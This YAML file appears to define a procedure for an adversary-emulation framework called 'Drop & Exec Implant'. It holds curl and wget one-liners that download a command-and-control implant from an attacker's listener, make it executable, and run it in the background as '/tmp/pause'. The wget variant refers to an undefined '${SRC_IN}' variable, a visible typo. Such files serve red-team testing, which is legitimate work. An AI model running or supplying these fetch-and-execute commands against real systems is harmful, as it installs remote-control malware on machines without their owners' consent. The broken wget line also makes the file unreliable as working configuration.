name: Drop & Exec Implant
description: Command to download a prepared C2 implant and execute it to establish a session
tactic: Execution
techniques: ["User Execution"]
parameters:
  LISTENER:
    type: string
    description: the URL of the listener, which as a fileshare
  FILESHARE_PORT:
    type: int
    description: the port of the fileshare on the listener
  SRC_BIN:
    type: string
    description: the name of the binary on the fileshare
  DST_BIN:
    type: string
    description: the destination path of the binary at the remote system
    required: false
args:
  SRC_BIN: "implant"
  DST_BIN: "/tmp/pause"
procedures:
  - key: curl
    command: curl -L ${LISTENER}:${FILESHARE_PORT}/${SRC_BIN} -o ${DST_BIN}  && chmod +x ${DST_BIN} && ${DST_BIN} &
  - key: wget
    command: wget ${LISTENER}:${FILESHARE_PORT}/${SRC_IN} -O ${DST_BIN} && chmod +x ${DST_BIN} && ${DST_BIN} &
preconditions:
  kind: System
  accessLevel: "user-exec"
